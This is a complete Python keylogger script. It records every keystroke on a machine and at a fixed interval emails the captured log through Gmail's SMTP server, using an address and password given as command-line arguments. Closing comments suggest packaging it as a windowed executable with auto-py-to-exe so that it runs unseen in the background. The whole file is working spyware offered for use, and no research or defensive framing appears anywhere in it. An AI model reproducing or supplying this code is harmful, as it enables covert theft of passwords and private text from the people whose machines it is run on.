# for sending mails
import smtplib
import sys

try:
    # get full control of keyboard
    import keyboard
except ModuleNotFoundError:
    print("Error : Cannot import keyboard!")
    print("If not installed :\n(run this command)\npip install keyboard")
    sys.exit(1)


# Semaphore to block and unblock the thread
# Timer to run a method after a particular interval of time
from threading import Semaphore, Timer

# before running the script set "ACCESS TO LESS SECURE APPS" to YES in google account

try:
    # sys.argv[1] will take time in seconds as first CLA
    # or we can replace sys.argv[1] with 60 for (1 minute)
    TIME_INTERVAL = int(sys.argv[1])
    # sys.argv[2] will take email as second CLA
    # or we can replace sys.argv[2] with "email"
    EMAIL = sys.argv[2]
    # sys.argv[3] will take password as third CLA
    # or we can replace sys.argv[3] with "password"
    PASSWORD = sys.argv[3]
except IndexError or TypeError:
    print("Usage :\npython3 keylogger.py \"time_interval_in_seconds\" \"email\" \"password\"")
    sys.exit(1)


if len(EMAIL) <= 0 or len(PASSWORD) <= 0:
    print("Enter email and password first...")
    sys.exit(1)


class Keylogger:
    def __init__(self, interval):
        # time interval
        self.interval = interval
        # log of key strokes
        self.log = ""
        # semaphore state
        self.semaphore = Semaphore(0)

    def callback(self,event):
        # this method is called on every keystroke
        name = event.name
        if len(name) > 1:
            if name == "space":
                # replace space with " "
                name = " "
            elif name == "enter":
                # replace enter with "[ENTER]\n"
                name = "[ENTER]\n"
            elif name == "decimal":
                # replace decimal with "."
                name = "."
            else:
                # for other events like CTRL, SHIFT, etc
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        self.log += name

    def sendmail(self, email, password, message):
        # manages a connection with SMTP server of google
        server = smtplib.SMTP(host="smtp.gmail.com", port=587)
        # connects to SMTP as TLS mode
        server.starttls()
        # login details
        server.login(email, password)
        # send actual message
        server.sendmail(email, email, message)
        # terminates the connection
        server.quit()

    def report(self):
        # gets called after every "self.interval"
        if self.log:
            self.sendmail(EMAIL, PASSWORD, self.log)
        self.log = ""
        Timer(interval=self.interval, function=self.report).start()

    def start(self):
        keyboard.on_release(callback=self.callback)
        self.report()
        self.semaphore.acquire()


Keylogger = Keylogger(interval=TIME_INTERVAL)
Keylogger.start()

# convert to window based exe with auto-py-to-exe
# and pass email and password as command line argument
# to exe file, so that it can run in background